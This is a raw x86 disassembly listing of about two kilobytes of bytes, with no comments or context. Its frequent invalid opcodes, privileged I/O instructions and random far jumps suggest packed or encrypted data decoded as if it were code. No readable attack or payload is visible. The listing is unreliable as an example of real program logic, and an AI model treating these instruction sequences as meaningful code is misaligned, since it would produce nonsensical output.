  4193eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ec:	stos   DWORD PTR es:[edi],eax
  4193ed:	inc    eax
  4193ee:	push   cs
  4193ef:	xchg   al,bl
  4193f1:	pop    esi
  4193f2:	fbld   TBYTE PTR [esi-0x6707743c]
  4193f8:	int    0x56
  4193fa:	push   0xf2129d2
  4193ff:	js     0x419439
  419401:	in     al,dx
  419402:	mov    WORD PTR [eax],?
  419404:	jns    0x419457
  419406:	xor    bh,0xf4
  419409:	loope  0x41943d
  41940b:	jmp    0x861224f
  419410:	push   0x385ab58c
  419415:	adc    al,0xe1
  419417:	push   esp
  419418:	fist   WORD PTR [ecx-0x2c]
  41941b:	jae    0x4193e2
  41941d:	jne    0x4193b7
  41941f:	rol    DWORD PTR [ebp-0x11],cl
  419422:	rcr    DWORD PTR [ebp+0x1e5e9c77],cl
  419428:	pop    esp
  419429:	mov    es,WORD PTR [edi]
  41942b:	dec    ecx
  41942c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41942d:	adc    DWORD PTR [esi],ebx
  41942f:	xchg   edi,eax
  419430:	hlt    
  419431:	sbb    esi,edx
  419433:	rcl    DWORD PTR [edx+ecx*1-0x19d63252],cl
  41943a:	lods   eax,DWORD PTR ds:[esi]
  41943b:	inc    ebx
  41943c:	inc    esp
  41943d:	in     eax,dx
  41943e:	popa   
  41943f:	(bad)  
  419441:	leave  
  419442:	leavew 
  419444:	sahf   
  419445:	cmp    DWORD PTR [ebp+ebx*8+0x76],ebp
  419449:	push   0x86b2a06c
  41944e:	pop    ss
  41944f:	xchg   esp,eax
  419450:	fnstsw WORD PTR [edi-0x68]
  419453:	xor    ah,BYTE PTR ds:0x11781e0e
  419459:	into   
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	cs jmp 0x7ee32b19
  419461:	stc    
  419462:	aas    
  419463:	mov    ecx,0xa67b1337
  419468:	aas    
  419469:	xor    ah,BYTE PTR [esi-0xf882d32]
  41946f:	jae    0x4194b4
  419471:	imul   edi,esp,0x61
  419474:	data16 jae 0x419414
  419477:	sub    ah,ch
  419479:	xchg   esp,eax
  41947a:	clc    
  41947b:	pushf  
  41947c:	xchg   edi,eax
  41947d:	or     dh,BYTE PTR [ebx-0x726884f8]
  419483:	iret   
  419484:	stc    
  419485:	push   esi
  419486:	imul   ecx,DWORD PTR [ecx-0x1e69aafc],0x379d888a
  419490:	xchg   DWORD PTR [ecx-0x7cf50cd5],esp
  419496:	jmp    0xb37a:0xceae8689
  41949d:	inc    esp
  41949e:	or     DWORD PTR [esi],ecx
  4194a0:	out    0xfa,al
  4194a2:	popf   
  4194a3:	dec    ecx
  4194a4:	(bad)  
  4194a6:	cwde   
  4194a7:	jns    0x41946f
  4194a9:	fcmove st,st(3)
  4194ab:	sbb    eax,DWORD PTR [ecx+0x2836607f]
  4194b1:	inc    edi
  4194b2:	xchg   ecx,eax
  4194b3:	and    DWORD PTR [edx+edx*2],eax
  4194b6:	loopne 0x4194fa
  4194b8:	jmp    0x544b:0x1572bd4b
  4194bf:	pop    esi
  4194c0:	in     al,0x71
  4194c2:	hlt    
  4194c3:	xor    ebp,DWORD PTR [ebx*1-0x3a51bfcf]
  4194ca:	cmp    al,0x75
  4194cc:	popa   
  4194cd:	int3   
  4194ce:	xchg   ch,dl
  4194d0:	and    cl,BYTE PTR [ecx]
  4194d2:	lods   al,BYTE PTR ds:[esi]
  4194d3:	sub    esi,ebx
  4194d5:	sahf   
  4194d6:	fiadd  DWORD PTR [edi-0x43]
  4194d9:	std    
  4194da:	outs   dx,BYTE PTR ds:[esi]
  4194db:	dec    eax
  4194dc:	cdq    
  4194dd:	scas   eax,DWORD PTR es:[edi]
  4194de:	sub    DWORD PTR [edx+0x24],edx
  4194e1:	stos   DWORD PTR es:[edi],eax
  4194e2:	jnp    0x4194ac
  4194e4:	repnz in eax,0x6e
  4194e7:	shr    BYTE PTR [ecx],1
  4194e9:	jb     0x4194e0
  4194eb:	push   ebx
  4194ec:	jmp    0xa575abd2
  4194f1:	arpl   bp,bp
  4194f3:	xchg   BYTE PTR [edi-0x7b],cl
  4194f6:	xchg   esp,eax
  4194f7:	sbb    al,0xb3
  4194f9:	sub    eax,0xe729286d
  4194fe:	and    dl,BYTE PTR [ecx]
  419500:	dec    edx
  419501:	sub    eax,0x5dd8e301
  419506:	addr16 mov ds:0x9c2a,eax
  41950a:	mov    ecx,0x36ec8f11
  41950f:	xor    eax,0x7573a92d
  419514:	and    bh,dl
  419516:	test   BYTE PTR [edx],dh
  419518:	imul   edi,DWORD PTR [eax+0x2d],0xffffff82
  41951c:	iret   
  41951d:	test   edx,ecx
  41951f:	rcl    BYTE PTR [edx-0x6],0x48
  419523:	int3   
  419524:	in     al,0x44
  419526:	int3   
  419527:	mov    ecx,0x832549cb
  41952c:	les    ecx,FWORD PTR [eax]
  41952e:	xor    esi,esi
  419530:	jns    0x419598
  419532:	xor    al,0x19
  419534:	lods   eax,DWORD PTR es:[esi]
  419536:	xor    ebp,DWORD PTR [eax+0x7a]
  419539:	outs   dx,DWORD PTR ds:[esi]
  41953a:	int    0x4a
  41953c:	ret    
  41953d:	(bad)  
  41953e:	stos   BYTE PTR es:[edi],al
  41953f:	into   
  419540:	dec    eax
  419541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419542:	push   ebp
  419543:	dec    edi
  419544:	or     al,0x45
  419546:	jmp    0x69cf:0x84da0720
  41954d:	in     eax,dx
  41954e:	imul   edx,DWORD PTR [edi-0x41d81d2],0x9c10388d
  419558:	inc    edi
  419559:	push   ecx
  41955a:	push   esi
  41955b:	daa    
  41955c:	fidiv  DWORD PTR ds:0x350020e
  419562:	mov    DWORD PTR [edx+0x1c91fa6f],edx
  419568:	mov    ds,WORD PTR [eax+0x43]
  41956b:	mov    gs,ecx
  41956d:	adc    BYTE PTR [edi-0x79],ah
  419570:	outs   dx,BYTE PTR ds:[esi]
  419572:	jno    0x419556
  419574:	ins    DWORD PTR es:[edi],dx
  419575:	pop    esp
  419576:	sbb    bh,al
  419578:	mov    dl,0x57
  41957a:	popa   
  41957b:	jle    0x419523
  41957d:	inc    eax
  41957e:	(bad)  
  419580:	int    0x19
  419582:	cli    
  419583:	inc    eax
  419584:	xor    ah,dh
  419586:	(bad)  
  419587:	mov    ah,BYTE PTR [eax-0x29515978]
  41958d:	mov    ecx,0x4e554d2f
  419592:	push   ecx
  419593:	push   edi
  419594:	mov    DWORD PTR [edi*1-0x3f320728],0x3f56938c
  41959f:	sub    ch,ah
  4195a1:	es pop esi
  4195a3:	adc    esi,esp
  4195a5:	mov    bl,0x57
  4195a7:	js     0x419537
  4195a9:	lea    esi,[ebp+0x4a]
  4195ac:	xor    edx,DWORD PTR [ecx+esi*8-0x4e39230a]
  4195b3:	mov    eax,0xedc506cb
  4195b8:	in     eax,0x54
  4195ba:	mov    ah,0x8b
  4195bc:	mov    dh,0x83
  4195be:	or     al,0x50
  4195c0:	loopne 0x419639
  4195c2:	xor    al,0x3f
  4195c4:	(bad)  
  4195c5:	dec    ebx
  4195c6:	int3   
  4195c7:	and    ebx,DWORD PTR [ebx]
  4195c9:	mov    ebx,0x157a4054
  4195ce:	and    DWORD PTR [eax+0x4f],edx
  4195d1:	and    BYTE PTR [ecx],bl
  4195d3:	jge    0x4195a5
  4195d5:	mov    bh,0xa4
  4195d7:	xlat   BYTE PTR ds:[ebx]
  4195d8:	inc    esp
  4195d9:	jne    0x4195da
  4195db:	rol    cl,0xe1
  4195de:	stc    
  4195df:	cmp    DWORD PTR [ecx],ebp
  4195e1:	ficomp DWORD PTR [ecx]
  4195e3:	dec    eax
  4195e4:	xor    eax,0x565ff68a
  4195e9:	jmp    0xc2305f5b
  4195ee:	aaa    
  4195ef:	cmp    eax,0x52014dc8
  4195f4:	xchg   al,al
  4195f6:	mul    BYTE PTR [ebp+0x60]
  4195f9:	aad    0x14
  4195fb:	mov    al,0x7a
  4195fd:	pop    edi
  4195fe:	cmp    eax,0xc8ab5d31
  419603:	fidiv  WORD PTR [ebp+0x3e]
  419606:	(bad)  
  419607:	mov    eax,0xaa49c27d
  41960c:	push   ecx
  41960d:	sbb    DWORD PTR [ebx],eax
  41960f:	ds lahf 
  419611:	hlt    
  419612:	repz clc 
  419614:	les    ebp,FWORD PTR [ebp+ebx*1+0x22]
  419618:	imul   ebx,edx,0x4881e3a6
  41961e:	pop    ss
  41961f:	add    al,BYTE PTR [edi+ebx*1+0x5c6af74c]
  419626:	jp     0x419696
  419628:	cmp    dl,BYTE PTR [edi]
  41962a:	inc    ecx
  41962b:	push   edx
  41962c:	mov    al,gs:0x55999d0a
  419632:	das    
  419633:	leave  
  419634:	and    DWORD PTR fs:[edx-0x6b6fd355],esi
  41963b:	sbb    al,0xaf
  41963d:	bound  esi,QWORD PTR [eax-0x53]
  419640:	ror    ecx,cl
  419642:	mov    al,0xa1
  419644:	repnz adc ah,ch
  419647:	mov    dl,0xbb
  419649:	pop    ecx
  41964a:	scas   al,BYTE PTR es:[edi]
  41964b:	jge    0x41966a
  41964d:	in     al,dx
  41964e:	dec    eax
  41964f:	mov    ds:0x91fad07d,eax
  419654:	dec    ecx
  419655:	lds    esp,FWORD PTR [edx]
  419657:	sbb    bl,BYTE PTR [ebx+eax*4+0xfb2722a]
  41965e:	adc    eax,0x5b3714b2
  419663:	loopne 0x419673
  419665:	(bad)  
  419666:	dec    ebp
  419667:	shl    DWORD PTR [ecx+0x32],1
  41966a:	fucomip st,st(4)
  41966c:	sub    eax,0xe180e696
  419671:	jmp    0xbf0d072
  419676:	xchg   edi,eax
  419677:	inc    esi
  419678:	call   0x324c0112
  41967d:	cdq    
  41967e:	push   cs
  41967f:	sub    DWORD PTR [ebx-0x43],0x616fcd6a
  419686:	test   DWORD PTR [ecx],0xcd44986b
  41968c:	xchg   esp,eax
  41968d:	rcl    BYTE PTR [ecx+0x3ea7e2c3],0xc
  419694:	jmp    0xe046484c
  419699:	int    0xe7
  41969b:	fimul  WORD PTR [edi+edx*2+0x4650c57f]
  4196a2:	pop    eax
  4196a3:	arpl   cx,ax
  4196a5:	inc    edi
  4196a6:	mov    ecx,0x36e3daa4
  4196ab:	call   0xec8e9475
  4196b0:	push   edi
  4196b1:	push   edx
  4196b2:	jmp    0x2ec2:0x856b8dc
  4196b9:	jo     0x419674
  4196bb:	loope  0x4196e2
  4196bd:	aad    0x20
  4196bf:	pop    edx
  4196c0:	lds    esp,FWORD PTR [esi+0x74cef52f]
  4196c6:	scas   eax,DWORD PTR es:[edi]
  4196c7:	test   DWORD PTR [esi+0x44],esp
  4196ca:	pop    esi
  4196cb:	pop    ss
  4196cc:	xchg   edx,eax
  4196cd:	mov    esi,0xc5bcac44
  4196d2:	xchg   DWORD PTR [esp+esi*1+0x26b30997],edi
  4196d9:	jnp    0x41966d
  4196db:	push   es
  4196dc:	retf   
  4196dd:	shl    BYTE PTR [ebx],1
  4196df:	add    esp,DWORD PTR [ebp+eax*2+0x1b]
  4196e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196e4:	add    BYTE PTR [edi-0xe],ah
  4196e7:	push   es
  4196e8:	and    bh,dl
  4196ea:	scas   eax,DWORD PTR es:[edi]
  4196eb:	(bad)  
  4196ec:	cmp    DWORD PTR [ebp-0x1f9c30fc],esi
  4196f2:	out    0xa1,eax
  4196f4:	lea    edx,[edi]
  4196f6:	and    eax,0xb2a89435
  4196fb:	dec    BYTE PTR [edx-0x47bee682]
  419701:	jl     0x419685
  419703:	cmp    ah,0x14
  419706:	fisttp DWORD PTR [eax+0x3c]
  419709:	retf   0xfe72
  41970c:	cmc    
  41970d:	cld    
  41970e:	mov    si,0xef7e
  419712:	pop    eax
  419713:	pusha  
  419714:	sub    ecx,DWORD PTR [ebp+0x3b2170d1]
  41971a:	test   BYTE PTR [edi-0x6c],ah
  41971d:	add    al,0x6f
  41971f:	out    dx,eax
  419720:	push   cs
  419721:	inc    eax
  419722:	add    ebx,esi
  419724:	pop    ecx
  419725:	add    eax,0xe13e9683
  41972a:	push   ecx
  41972b:	dec    eax
  41972c:	xor    DWORD PTR [esi+0x7e9db361],ebx
  419732:	adc    edx,edx
  419734:	(bad)  
  419736:	mov    BYTE PTR [ecx+edx*2-0x168c05bf],bh
  41973d:	mov    DWORD PTR [eax+0x50106ca5],0x52976256
  419747:	xlat   BYTE PTR ds:[ebx]
  419748:	cs pop es
  41974a:	lahf   
  41974b:	not    DWORD PTR [edx-0x5a08ddbe]
  419751:	jge    0x419774
  419753:	rol    DWORD PTR [edi],0x47
  419756:	and    ebx,DWORD PTR [ecx+0x512bb674]
  41975c:	sbb    DWORD PTR [eax-0x482b1207],esp
  419762:	and    DWORD PTR [ecx],ebp
  419764:	cmp    BYTE PTR [ebx-0x66],0x3a
  419768:	test   BYTE PTR [ebx-0x16],cl
  41976b:	adc    al,0x72
  41976d:	push   es
  41976e:	pop    eax
  41976f:	jg     0x4197af
  419771:	xor    BYTE PTR [edx-0x46],ah
  419774:	sbb    al,0x71
  419776:	sub    cl,dl
  419778:	rcr    bl,0x19
  41977b:	sbb    al,0x26
  41977d:	enter  0xea89,0x3f
  419781:	cmp    eax,0xff824f5f
  419786:	mov    ds:0xe0d7015b,al
  41978b:	jg     0x41978c
  41978d:	(bad)  
  41978f:	rcl    ecx,cl
  419791:	xor    ah,BYTE PTR [edi-0x30e78fa4]
  419797:	and    ch,BYTE PTR [esi+ecx*1]
  41979a:	jp     0x419753
  41979c:	jge    0x4197e7
  41979e:	call   FWORD PTR [ecx+0xf]
  4197a1:	mov    WORD PTR [esp+esi*8-0x12349ed5],ss
  4197a8:	push   esp
  4197a9:	jge    0x4197cb
  4197ab:	iret   
  4197ac:	add    eax,0x6d5ef814
  4197b1:	mov    ebx,0x74a21cf8
  4197b6:	mov    ch,0xe3
  4197b8:	cs inc eax
  4197ba:	push   ebx
  4197bb:	xchg   al,ah
  4197bd:	or     edi,DWORD PTR [esi-0x4dac5410]
  4197c3:	mov    bh,0xb
  4197c5:	adc    DWORD PTR [eax],esi
  4197c7:	push   es
  4197c8:	xchg   edx,eax
  4197c9:	test   ebx,esi
  4197cb:	xchg   BYTE PTR [eax+0x6022f6d4],al
  4197d1:	and    edi,DWORD PTR [edi-0x14]
  4197d4:	sbb    al,BYTE PTR [esi+0x33]
  4197d7:	retf   0xe566
  4197da:	pop    edx
  4197db:	mov    dl,0xe9
  4197dd:	pop    edi
  4197de:	imul   edx,DWORD PTR [esi],0x71dccb61
  4197e4:	daa    
  4197e5:	(bad)  
  4197e6:	in     al,dx
  4197e7:	jg     0x4197a2
  4197e9:	xchg   edx,eax
  4197ea:	imul   edi,DWORD PTR [ecx+0x37],0x845f1cfe
  4197f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197f2:	push   ds
  4197f3:	repnz das 
  4197f5:	add    DWORD PTR [ebx+0x2fc0af16],esp
  4197fb:	xlat   BYTE PTR ds:[ebx]
  4197fc:	inc    eax
  4197fd:	scas   al,BYTE PTR es:[edi]
  4197fe:	mov    ebx,0x480786bc
  419803:	mov    al,BYTE PTR [edx]
  419805:	sahf   
  419806:	mov    ecx,0xa3eff2a3
  41980b:	or     BYTE PTR [ecx+0x38eb00b5],ah
  419811:	push   esp
  419812:	add    DWORD PTR [esi-0x70215c1b],0xffffff95
  419819:	dec    ebp
  41981a:	or     DWORD PTR [ebp+edi*2+0x414a584d],esp
  419821:	loop   0x419803
  419823:	retf   0x9128
  419826:	hlt    
  419827:	in     eax,dx
  419828:	cmp    bh,BYTE PTR [ebx-0x8]
  41982b:	pop    es
  41982c:	dec    esp
  41982d:	jecxz  0x41984b
  41982f:	push   ecx
  419830:	mov    dh,0x88
  419832:	test   edi,ebp
  419834:	jb     0x4197b9
  419836:	or     DWORD PTR [ebx],ecx
  419838:	inc    ebx
  419839:	xchg   esp,eax
  41983a:	xlat   BYTE PTR ds:[ebx]
  41983b:	adc    al,0x6c
  41983d:	call   0xae75:0xf820febe
  419844:	test   eax,0x23c6789f
  41984a:	pop    es
  41984b:	lods   al,BYTE PTR ds:[esi]
  41984c:	dec    bl
  41984e:	xchg   bh,ah
  419850:	sbb    BYTE PTR [ebx+ebx*8-0xe970ba1],dl
  419857:	sub    eax,0x2bcdf80
  41985c:	gs inc ebx
  41985e:	pop    DWORD PTR [ebx+0x693793b3]
  419864:	test   DWORD PTR [edi-0x62a0cc2f],esi
  41986a:	mov    eax,ds:0x710bc707
  41986f:	test   al,0xa5
  419871:	dec    esi
  419872:	rol    DWORD PTR [edx+0x25e5ed62],0xdf
  419879:	pushf  
  41987a:	adc    DWORD PTR [ecx+0x675e9041],edx
  419880:	mov    BYTE PTR [ebx-0x16],dl
  419883:	fisub  DWORD PTR [esi]
  419885:	pop    esp
  419886:	inc    ebx
  419887:	scas   eax,DWORD PTR es:[edi]
  419888:	inc    esi
  419889:	inc    ecx
  41988a:	into   
  41988b:	lock jge 0x419820
  41988e:	stos   DWORD PTR es:[edi],eax
  41988f:	jnp    0x419840
  419891:	mov    al,ds:0x89aa742
  419896:	mov    eax,0xcebbf8e4
  41989b:	je     0x41983e
  41989d:	jg     0x41990d
  41989f:	jno    0x41985f
  4198a1:	mov    cl,0x20
  4198a3:	xchg   esp,eax
  4198a4:	sahf   
  4198a5:	push   ebx
  4198a6:	jp     0x4198d9
  4198a8:	call   0xf3b2fa1d
  4198ad:	cmp    eax,0x7234db65
  4198b2:	jmp    0x41985d
  4198b4:	adc    eax,0xb34e040b
  4198b9:	sahf   
  4198ba:	cwde   
  4198bb:	outs   dx,DWORD PTR ds:[esi]
  4198bc:	push   es
  4198bd:	std    
  4198be:	invd   
  4198c0:	rcl    DWORD PTR [ebx+0x53],1
  4198c3:	in     eax,0x5d
  4198c5:	inc    edx
  4198c6:	or     DWORD PTR [edi-0x667337a3],0xffffff87
  4198cd:	fldz   
  4198cf:	push   es
  4198d0:	inc    ecx
  4198d1:	sbb    DWORD PTR [edx],0x14
  4198d4:	shl    BYTE PTR [eax],0x24
  4198d7:	xchg   edx,eax
  4198d8:	shl    BYTE PTR [ecx+0x42],0x48
  4198dc:	fdiv   DWORD PTR [edi]
  4198de:	(bad)
  4198e3:	adc    dl,ch
  4198e5:	push   cs
  4198e6:	jae    0x41986e
  4198e8:	mov    edi,0xeb82345d
  4198ed:	and    eax,0x79e113f9
  4198f2:	mov    ebp,0x256d6907
  4198f7:	push   edi
  4198f8:	pop    ss
  4198f9:	push   es
  4198fa:	jle    0x419914
  4198fc:	pop    ss
  4198fd:	inc    esp
  4198fe:	loope  0x4198ef
  419900:	aad    0x20
  419902:	cli    
  419903:	and    ecx,edx
  419905:	in     eax,0x79
  419907:	inc    BYTE PTR [esp+edx*2-0x6d922074]
  41990e:	rcl    dh,1
  419910:	loope  0x419911
  419912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419913:	iret   
  419914:	pop    eax
  419915:	icebp  
  419916:	xchg   BYTE PTR [ebx+0xd9ca3d6],dh
  41991c:	cmp    BYTE PTR [edx-0x56829ff1],bl
  419922:	add    eax,0x6e7fadf
  419927:	jg     0x4198b5
  419929:	jmp    FWORD PTR [eax]
  41992b:	cmp    eax,0x1aea960d
  419930:	mov    BYTE PTR [eax],dh
  419932:	in     al,dx
  419933:	pop    esi
  419934:	push   ss
  419935:	sar    ebp,0x92
  419938:	dec    edx
  419939:	cmp    al,0x29
  41993b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41993d:	repz imul esp,DWORD PTR [ebp-0x4bc5986a],0xffffffc3
  419945:	jnp    0x41997f
  419947:	add    BYTE PTR [edi+0x7d],ah
  41994a:	pop    edx
  41994b:	out    dx,eax
  41994c:	cmp    BYTE PTR [edx-0x5e604866],cl
  419952:	pop    ss
  419953:	and    al,0x59
  419955:	dec    ecx
  419956:	sub    ch,BYTE PTR [eax-0x5a]
  419959:	in     eax,dx
  41995a:	retf   0x6d5c
  41995d:	sub    edx,DWORD PTR [ebx]
  41995f:	xchg   ecx,eax
  419960:	add    eax,0xab24acca
  419965:	mov    ch,0x75
  419967:	dec    eax
  419968:	dec    esp
  419969:	sub    BYTE PTR [ecx-0x199a6c03],ch
  41996f:	push   eax
  419970:	xlat   BYTE PTR ds:[ebx]
  419971:	out    0xf6,al
  419973:	jle    0x4199b8
  419975:	mov    BYTE PTR [eax-0x52898944],bh
  41997b:	jecxz  0x4199fc
  41997d:	mov    ebp,ecx
  41997f:	(bad)  
  419980:	outs   dx,DWORD PTR ds:[esi]
  419981:	mov    BYTE PTR [esi],0x4d
  419984:	js     0x41994d
  419986:	not    WORD PTR [ecx+0x4e018be7]
  41998d:	out    0x4d,eax
  41998f:	cli    
  419990:	sar    bh,1
  419992:	add    eax,0x5c320e48
  419997:	jmp    0x2c79:0xedc333d8
  41999e:	stos   DWORD PTR es:[edi],eax
  41999f:	or     ah,BYTE PTR [edx+ecx*2-0x67]
  4199a3:	cdq    
  4199a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a5:	jo     0x4199bd
  4199a7:	push   esi
  4199a8:	and    BYTE PTR [eax+0x21],ch
  4199ab:	nop
  4199ac:	icebp  
  4199ad:	cmp    al,0xeb
  4199af:	int    0x8d
  4199b1:	jbe    0x419a21
  4199b3:	data16 sbb al,0xa0
  4199b6:	push   0x6556d181
  4199bb:	mov    ebp,0xdc3a09ec
  4199c0:	bound  ecx,QWORD PTR [edi+ebx*2]
  4199c3:	cmp    al,0x1f
  4199c5:	mov    ds:0x5be86708,al
  4199ca:	rcl    esi,cl
  4199cc:	cmp    DWORD PTR [edx+0x3fc02b76],ebx
  4199d2:	pop    edi
  4199d3:	in     eax,dx
  4199d4:	xchg   esi,eax
  4199d5:	js     0x419a48
  4199d7:	push   esi
  4199d8:	ret    0x79d6
  4199db:	jae    0x419988
  4199dd:	fisubr DWORD PTR [ecx+esi*1-0x1c]
  4199e1:	mov    dl,0xd7
  4199e3:	dec    edx
  4199e4:	mov    dh,0xa2
  4199e6:	stos   DWORD PTR es:[edi],eax
  4199e7:	or     DWORD PTR [ebx+0x7c],ebx
  4199ea:	loopne 0x419974
  4199ec:	and    DWORD PTR [ecx-0x25],ecx
  4199ef:	and    DWORD PTR [edi-0x41348270],esp
  4199f5:	popa   
  4199f6:	test   eax,0x6dded4b1
  4199fb:	push   esi
  4199fc:	lock jno 0x419a48
  4199ff:	rcl    DWORD PTR [ecx+esi*1+0x2c],0x87
  419a04:	sbb    edi,DWORD PTR [ebp-0x38]
  419a07:	jge    0x419a63
  419a09:	(bad)  
  419a0a:	and    eax,0xcc0d914e
  419a0f:	loop   0x4199a0
  419a11:	jo     0x419a66
  419a13:	cmp    eax,0xbcb9a7f2
  419a18:	imul   esp,ebx,0x16db244d
  419a1e:	or     BYTE PTR [ecx-0x263f4000],al
  419a24:	fs loope 0x419a8f
  419a27:	sub    BYTE PTR [ebp+0x5e],ah
  419a2a:	call   0x239f:0xf0845a9
  419a31:	mov    fs,WORD PTR ds:0x9012cf58
  419a37:	loope  0x419aab
  419a39:	adc    ch,BYTE PTR [edx-0x78]
  419a3c:	xchg   edx,eax
  419a3d:	(bad)  
  419a3e:	xchg   ecx,eax
  419a3f:	test   eax,0x14978b1e
  419a44:	icebp  
  419a45:	int    0x42
  419a47:	fsubrp st(5),st
  419a49:	out    0xc1,al
  419a4b:	test   al,0x90
  419a4d:	cmp    edi,edi
  419a4f:	inc    ebp
  419a50:	xchg   BYTE PTR [edx],dh
  419a52:	jecxz  0x419a17
  419a54:	fisttp QWORD PTR [esi+0x5b]
  419a57:	inc    esi
  419a58:	jmp    0x3277b23d
  419a5d:	(bad)  
  419a5e:	jmp    0x419a0e
  419a60:	inc    ecx
  419a61:	jge    0x419a3a
  419a63:	retf   0xccbc
  419a66:	adc    eax,DWORD PTR [eax-0x38]
  419a69:	jp     0x4199eb
  419a6b:	mov    ds:0xf3b8f4ce,eax
  419a70:	shr    DWORD PTR [esi],1
  419a72:	push   ebx
  419a73:	mov    ebx,ecx
  419a75:	sub    dl,BYTE PTR [eax+edi*1]
  419a78:	aam    0x35
  419a7a:	jp     0x419a54
  419a7c:	add    esp,DWORD PTR ss:[edi]
  419a7f:	jmp    0x419ada
  419a81:	pop    ebp
  419a82:	nop
  419a83:	and    edx,edx
  419a85:	xor    BYTE PTR [edx-0x80],dl
  419a88:	call   0x5eb6:0xd851029f
  419a8f:	sub    bh,ah
  419a91:	or     ch,ah
  419a93:	push   cs
  419a94:	xchg   ebx,eax
  419a95:	and    BYTE PTR [eax+0xccb42],al
  419a9b:	add    ebp,DWORD PTR [ebx]
  419a9d:	adc    eax,0xa68d600e
  419aa2:	push   edx
  419aa3:	enter  0x49ad,0x22
  419aa7:	add    eax,DWORD PTR [ecx+0xd]
  419aaa:	mov    dl,BYTE PTR [eax]
  419aac:	and    BYTE PTR [ebx-0x65c5f81a],ch
  419ab2:	(bad)  
  419ab3:	dec    ebx
  419ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ab5:	retf   
  419ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ab7:	scas   al,BYTE PTR es:[edi]
  419ab8:	inc    ebx
  419ab9:	test   eax,0x86b9955d
  419abe:	rol    BYTE PTR [ecx-0x565639a4],cl
  419ac4:	push   cs
  419ac5:	or     edx,DWORD PTR [ebx+0x64]
  419ac8:	sub    al,BYTE PTR [esi-0x203a9b13]
  419ace:	imul   esi,DWORD PTR [edi-0x3c],0x5efdb11
  419ad5:	pop    ds
  419ad6:	iret   
  419ad7:	and    BYTE PTR ds:0xc59254c9,cl
  419add:	mov    cl,0xe2
  419adf:	jle    0x419a73
  419ae1:	adc    DWORD PTR [ebp-0x59c480e5],ecx
  419ae7:	(bad)  
  419ae8:	fnstsw WORD PTR [esi]
  419aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aeb:	lahf   
  419aec:	aam    0x1
  419aee:	sub    al,0xee
  419af0:	popa   
  419af1:	shl    BYTE PTR [edi],0x87
  419af4:	xlat   BYTE PTR ds:[ebx]
  419af5:	xlat   BYTE PTR ds:[ebx]
  419af6:	sahf   
  419af7:	jns    0x419aee
  419af9:	jp     0x419adc
  419afb:	xchg   esp,eax
  419afc:	jp     0x419b02
  419afe:	jo     0x419ac3
  419b00:	jmp    0xd10457f5
  419b05:	sub    dh,cl
  419b07:	pop    ecx
  419b08:	pop    esi
  419b09:	mov    al,0xa4
  419b0b:	les    esi,FWORD PTR [edi+ebp*8]
  419b0e:	adc    bh,BYTE PTR [esi]
  419b10:	ror    ah,cl
  419b12:	add    ecx,DWORD PTR [ebx+edx*1-0x17]
  419b16:	mov    esi,0x385183fe
  419b1b:	cmp    DWORD PTR [edi],ebx
  419b1d:	jmp    0x419b6f
  419b1f:	dec    eax
  419b20:	sub    ecx,DWORD PTR [esp+eax*2+0x5820b25c]
  419b27:	retf   
  419b28:	pop    edx
  419b29:	cmp    BYTE PTR [esi+ebx*4-0x28],dl
  419b2d:	mov    al,0x2f
  419b2f:	xor    al,0xa
  419b31:	(bad)  
  419b32:	mov    WORD PTR [eax],gs
  419b34:	xchg   ebp,eax
  419b35:	xlat   BYTE PTR ds:[ebx]
  419b36:	cmp    eax,0x3ebc5188
  419b3b:	test   DWORD PTR [ebx],ebp
  419b3d:	add    BYTE PTR [eax+eiz*8],dl
  419b40:	jnp    0x419aea
  419b42:	xor    eax,0x40c74c4d
  419b47:	mov    edi,0xab0f916d
  419b4c:	jge    0x419b53
  419b4e:	inc    esi
  419b4f:	mov    ds:0x90f645,al
  419b54:	jne    0x419b3b
  419b56:	jnp    0x419bcc
  419b58:	std    
  419b59:	movd   mm1,DWORD PTR [esi-0x10af3a43]
  419b60:	fild   QWORD PTR [eax+0x215a2a50]
  419b66:	push   edx
  419b67:	ret    0x4485
  419b6a:	mov    es,WORD PTR [edx]
  419b6c:	aaa    
  419b6d:	inc    edx
  419b6e:	mov    ebp,0x395532b4
  419b73:	jl     0x419af5
  419b75:	adc    BYTE PTR [edx+0x73ce18b3],bh
  419b7b:	nop
  419b7c:	add    BYTE PTR [eax-0x6c],0x6d
  419b80:	(bad)
  419b83:	pusha  
  419b84:	arpl   WORD PTR fs:[edx+ebx*8+0x2f],sp
  419b89:	inc    ebp
  419b8a:	cld    
  419b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b8c:	pop    eax
  419b8d:	shr    al,1
  419b8f:	xchg   BYTE PTR [ebx+0x1d71c823],dl
  419b95:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  419b97:	xchg   DWORD PTR [esi+eiz*8+0x24],ecx
  419b9b:	or     DWORD PTR [eax+edi*8+0x42d5b6d2],0x77db2c9a
  419ba6:	mov    al,0xf5
  419ba8:	mov    esi,0xe08f74c4
  419bad:	mov    edx,0x2f45eeca
  419bb2:	lods   al,BYTE PTR ds:[esi]
  419bb3:	xchg   esp,eax
  419bb4:	mov    es,WORD PTR [esi+0x39]
  419bb7:	jp     0x419b46
  419bb9:	push   0xfb74c1b4
  419bbe:	sahf   
  419bbf:	sbb    BYTE PTR [edx-0x40],bh
  419bc2:	stos   DWORD PTR es:[edi],eax
  419bc3:	add    al,0x26
  419bc5:	test   eax,0xcbdb2997
  419bca:	xlat   BYTE PTR ds:[ebx]
  419bcb:	rcl    BYTE PTR [ebx],cl
  419bcd:	retf   
  419bce:	pop    es
  419bcf:	xor    eax,0xe123bf21
  419bd4:	or     bh,dl
  419bd6:	inc    esi
  419bd7:	and    al,0x13
  419bd9:	add    DWORD PTR [eax+ebp*8-0x4f4cf0aa],ebp
  419be0:	jl     0x419c00
